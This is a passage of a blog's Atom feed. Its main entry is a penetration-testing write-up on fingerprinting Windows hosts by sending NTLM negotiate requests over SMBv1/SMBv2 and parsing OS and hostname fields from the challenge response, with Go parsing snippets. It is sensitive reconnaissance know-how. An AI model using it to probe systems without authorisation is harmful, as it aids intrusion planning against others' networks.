        &lt;span class=&quot;token class-name&quot;&gt;CtClass&lt;/span&gt; ctClass &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; classPool&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;makeClass&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;clazzName&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt; clazz &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; ctClass&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;toClass&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        ctClass&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;defrost&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; clazz&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;</summary>
    
    
    
    <category term="Pentest" scheme="https://jkme.github.io/categories/Pentest/"/>
    
    
  </entry>
  
  <entry>
    <title>NTLM端口信息探测</title>
    <link href="https://jkme.github.io/2021/08/06/windows-ntlm-smb-scan.html"/>
    <id>https://jkme.github.io/2021/08/06/windows-ntlm-smb-scan.html</id>
    <published>2021-08-05T16:00:00.000Z</published>
    <updated>2022-01-21T03:21:08.000Z</updated>
    
    <content type="html"><![CDATA[<p>SMB（Server Message Block）协议，可用于在计算机间共享文件、打印机、串口等，电脑上的网上邻居就是靠它实现的。SMB使用了NetBIOS的应用程序接口 （Application Program Interface，简称API）。另外，它是一个开放性的协议，允许了协议扩展——使得它变得更大而且复杂；大约有65个最上层的作业，而每个作业都超过120个函数，甚至Windows NT也没有全部支持到，最近微软又把 SMB 改名为 CIFS（Common Internet File System），并且加入了许多新的特色。SMB协议一般端口使用为139，445，CIFS协议有三个版本：SMB、SMB2、SMB3。</p><h3 id="NTLM"><a href="#NTLM" class="headerlink" title="NTLM"></a>NTLM</h3><p>在type2返回Challenge的过程中，同时返回了操作系统类型，主机名，netbios名等等。这也就意味着如果我们在能跟服务器进行NTLM交流中，给服务器发送一个type1的请求，服务器返回type2的响应，这一步，我们就可以得到很多信息。SMBv1和SMBv2的数据包结构是不同的</p><h3 id="SMBv1"><a href="#SMBv1" class="headerlink" title="SMBv1"></a>SMBv1</h3><p>使用<a href="https://github.com/FeigongSec/NTLMINFO">非攻NTLMINFO</a>探测SMB接口，抓包通过wireshark分析，包含操作系统类型的数据包由SMB Header和Response组成：<br><img src="/2021/08/06/windows-ntlm-smb-scan/ntlm-1.png"><br>我们的目的是获取smb数据包的NTLM数据，然后对NTLM数据包解析，NTLM数据包上一层是GSS-API，首先找到GSS-API在整个数据包的偏移量，SMB的数据包结构长度如下：</p><pre class="line-numbers language-none"><code class="language-none">SMB Header:  32 byteWord Count:  1 byteAndXCommand: 1 byteReserved:    1 byteAndXOffset:  2 byteAction:    2 byteSecurity Blob Length: 2 byte (表示Security Blob的长度，这里的hex是 0f 10，小端转换为010f,再转换成10进制就是271，对应Security Blob的长度)Byte Count: 2 byte (表示Security Blob加上NativeOS和Native Lan的长度)Security Blob: 可变长度，取决于Security Blob Length<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面的数据包结构的关键数据是<code>Security Blob Length</code>和<code>Byte Content</code>，前者表示GSS-API的整个数据包长度，后者表示GSS-API和Native OS加上Native LM的数据长度：</p><h6 id="GSS-API的长度是271-Byte"><a href="#GSS-API的长度是271-Byte" class="headerlink" title="GSS-API的长度是271 Byte"></a>GSS-API的长度是271 Byte</h6><p><img src="/2021/08/06/windows-ntlm-smb-scan/ntlm-3.png"></p><h6 id="Native-OS的长度是42-Byte"><a href="#Native-OS的长度是42-Byte" class="headerlink" title="Native OS的长度是42 Byte"></a>Native OS的长度是42 Byte</h6><p><img src="/2021/08/06/windows-ntlm-smb-scan/ntlm-3.1.png"></p><h6 id="Native-LM的长度是38-Byte"><a href="#Native-LM的长度是38-Byte" class="headerlink" title="Native LM的长度是38 Byte"></a>Native LM的长度是38 Byte</h6><p><img src="/2021/08/06/windows-ntlm-smb-scan/ntlm-3.2.png"></p><p>所以数学题来了：<br>Security Blob Length转换成10进制是271 Byte</p><p>Byte Count: 271 + 42 + 38 = 351 Byte<br>我们的目的是获取NTLM的数据和NativeOS和Native LM，回到代码里面去看看，当我们获取到type2的数据，获取到的数据是什么呢？</p><p><img src="/2021/08/06/windows-ntlm-smb-scan/ntlm-4.png"></p><p>NetBIOS Session Service这一层的长度是4 Byte，<code>Security Blob Length</code>的偏移量就出来了: </p><pre class="line-numbers language-none"><code class="language-none">4 + 32 + 1 + 1 + 1 + 2 + 2 &#x3D; 43<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>所以<code>Security Blob Length</code>偏移从43开始，长度是2 Byte， <code>Security Blob</code>跟在后面，偏移从45开始，47结束，go语言伪代码：</p><pre class="line-numbers language-none"><code class="language-none">blob_length :&#x3D; uint16(bytes2Uint(ret[43:45], &#39;&lt;&#39;))blob_count :&#x3D; uint16(bytes2Uint(ret[45:47], &#39;&lt;&#39;))&#x2F;&#x2F;gss变量表示从Security Blob起始位置到数据包结束，包括了Native OS和Native LMgss :&#x3D; ret[47:]&#x2F;&#x2F;找到NTLMSSP在gss的偏移起始位置off_ntlm :&#x3D; bytes.Index(gss, []byte(&quot;NTLMSSP&quot;))&#x2F;&#x2F;Native OS和Native LM数据，对应上面的图native :&#x3D; gss[int(blob_length):blob_count]&#x2F;&#x2F;bs表示ntlm的数据，以NTLMSSP开头bs :&#x3D; gss[off_ntlm:blob_length]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接下来主要工作就是解析NTLM的数据，感谢iv4n师傅的<a href="http://iv4n.cc/ntlmssp/">Windows NTLM协议细节</a>，我fork了一份<a href="https://github.com/JKme/go-ntlmssp">go-ntlmssp</a>，增加了解析NTLM输出字符串函数，可以直接获取NTLMSSP数据的解析结果：</p><pre class="line-numbers language-none"><code class="language-none">func TestChallengeMsg_String(t *testing.T) &#123;bs, _ :&#x3D; hex.DecodeString(&quot;4e544c4d535350xxxxx&quot;)type2 :&#x3D; ChallengeMsg&#123;&#125;info :&#x3D; type2.String(bs)fmt.Println(info)&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/08/06/windows-ntlm-smb-scan/ntlm-5.png"></p><p>Windows10默认使用SMBv2协议，没有打开SMBv1开关，<a href="https://github.com/RowTeam/SharpDetectionNTLMSSP">Rcoll师傅的SharpDetectionNTLMSSP</a>只发送了SMBv1的探测，没有探测SMBv2。<a href="https://github.com/FeigongSec/NTLMINFO">非攻NTLMINFO</a>师傅就比较完整，先探测SMBv1，失败之后尝试SMBv2。</p><h3 id="SMBv2"><a href="#SMBv2" class="headerlink" title="SMBv2"></a>SMBv2</h3><p>参考<a href="https://github.com/FeigongSec/NTLMINFO/blob/016e1859b7c0f4cc55c923027bc24174b0586bc7/SmbInfo/SmbInfo/Program.cs#L83">非攻师傅的代码</a>，先发送第一次的探测请求，找到偏移量70的地方，做一次判断是否发送第二个数据包。换成GO代码就比较简单了，这里的偏移70保存的是是SMBv2的<code>Security mode</code>:</p><p><img src="/2021/08/06/windows-ntlm-smb-scan/ntlm-6.png"></p><p>Go语言如下：</p><pre class="line-numbers language-none"><code class="language-none">var NTLMSSPNegotiatev2Data []byteif hex.EncodeToString(r2[70:71]) &#x3D;&#x3D; &quot;03&quot; &#123;flags :&#x3D; []byte&#123;0x15, 0x82, 0x08, 0xa0&#125;NTLMSSPNegotiatev2Data &#x3D; getNTLMSSPNegotiateData(flags)&#125; else &#123;flags :&#x3D; []byte&#123;0x05, 0x80, 0x08, 0xa0&#125;NTLMSSPNegotiatev2Data &#x3D; getNTLMSSPNegotiateData(flags)&#125;_, err &#x3D; conn2.Write(NegotiateSMBv2Data2)if err !&#x3D; nil &#123;return&#125;readBytes(conn2)_, err &#x3D; conn2.Write(NTLMSSPNegotiatev2Data)ret, _ :&#x3D; readBytes(conn2)ntlmOff :&#x3D; bytes.Index(ret, []byte(&quot;NTLMSSP&quot;))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>成品主要参考非攻师傅的代码，集成到<a href="https://github.com/JKme/cube">Cube</a>，完成了winrm、wmi、smb、mssql端口的NTLM信息探测。</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://github.com/FeigongSec/NTLMINFO">非攻NTLMINFO</a></li><li><a href="https://github.com/RowTeam/SharpDetectionNTLMSSP">Rcoll师傅的SharpDetectionNTLMSSP</a></li><li><a href="https://github.com/zmap/zgrab2/tree/master/lib/smb/smb">An SMB library in Go</a></li><li><a href="https://daiker.gitbook.io/windows-protocol/ntlm-pian/4">NTLM基础介绍</a></li><li><a href="http://iv4n.cc/ntlmssp/">Windows NTLM协议细节</a></li><li><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-smb/f210069c-7086-4dc2-885e-861d837df688">Server Message Block (SMB) Protocol</a></li><li><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-smb2/5606ad47-5ee0-437a-817e-70c366052962">Server Message Block (SMB) Protocol Versions 2 and 3</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;SMB（Server Message Block）协议，可用于在计算机间共享文件、打印机、串口等，电脑上的网上邻居就是靠它实现的。SMB使用了NetBIOS的应用程序接口 （Application Program Interface，简称API）。另外，它是一个开放性的协议，允许了协议扩展——使得它变得更大而且复杂；大约有65个最上层的作业，而每个作业都超过120个函数，甚至Windows NT也没有全部支持到，最近微软又把 SMB 改名为 CIFS（Common Internet File System），并且加入了许多新的特色。SMB协议一般端口使用为139，445，CIFS协议有三个版本：SMB、SMB2、SMB3。&lt;/p&gt;
&lt;h3 id=&quot;NTLM&quot;&gt;&lt;a href=&quot;#NTLM&quot; class=&quot;headerlink&quot; title=&quot;NTLM&quot;&gt;&lt;/a&gt;NTLM&lt;/h3&gt;&lt;p&gt;在type2返回Challenge的过程中，同时返回了操作系统类型，主机名，netbios名等等。这也就意味着如果我们在能跟服务器进行NTLM交流中，给服务器发送一个type1的请求，服务器返回type2的响应，这一步，我们就可以得到很多信息。SMBv1和SMBv2的数据包结构是不同的&lt;/p&gt;
&lt;h3 id=&quot;SMBv1&quot;&gt;&lt;a href=&quot;#SMBv1&quot; class=&quot;headerlink&quot; title=&quot;SMBv1&quot;&gt;&lt;/a&gt;SMBv1&lt;/h3&gt;&lt;p&gt;使用&lt;a href=&quot;https://github.com/FeigongSec/NTLMINFO&quot;&gt;非攻NTLMINFO&lt;/a&gt;探测SMB接口，抓包通过wireshark分析，包含操作系统类型的数据包由SMB Header和Response组成：&lt;br&gt;&lt;img src=&quot;/2021/08/06/windows-ntlm-smb-scan/ntlm-1.png&quot;&gt;&lt;br&gt;我们的目的是获取smb数据包的NTLM数据，然后对NTLM数据包解析，NTLM数据包上一层是GSS-API，首先找到GSS-API在整个数据包的偏移量，SMB的数据包结构长度如下：&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;SMB Header:  32 byte
Word Count:  1 byte
AndXCommand: 1 byte
Reserved:    1 byte
AndXOffset:  2 byte
Action: 	   2 byte
Security Blob Length: 2 byte (表示Security Blob的长度，这里的hex是 0f 10，小端转换为010f,再转换成10进制就是271，对应Security Blob的长度)
Byte Count: 2 byte (表示Security Blob加上NativeOS和Native Lan的长度)
Security Blob: 可变长度，取决于Security Blob Length&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;上面的数据包结构的关键数据是&lt;code&gt;Security Blob Length&lt;/code&gt;和&lt;code&gt;Byte Content&lt;/code&gt;，前者表示GSS-API的整个数据包长度，后者表示GSS-API和Native OS加上Native LM的数据长度：&lt;/p&gt;
&lt;h6 id=&quot;GSS-API的长度是271-Byte&quot;&gt;&lt;a href=&quot;#GSS-API的长度是271-Byte&quot; class=&quot;headerlink&quot; title=&quot;GSS-API的长度是271 Byte&quot;&gt;&lt;/a&gt;GSS-API的长度是271 Byte&lt;/h6&gt;&lt;p&gt;&lt;img src=&quot;/2021/08/06/windows-ntlm-smb-scan/ntlm-3.png&quot;&gt;&lt;/p&gt;
&lt;h6 id=&quot;Native-OS的长度是42-Byte&quot;&gt;&lt;a href=&quot;#Native-OS的长度是42-Byte&quot; class=&quot;headerlink&quot; title=&quot;Native OS的长度是42 Byte&quot;&gt;&lt;/a&gt;Native OS的长度是42 Byte&lt;/h6&gt;</summary>
    
    
    
    <category term="Pentest" scheme="https://jkme.github.io/categories/Pentest/"/>
    
    
  </entry>
  
</feed>
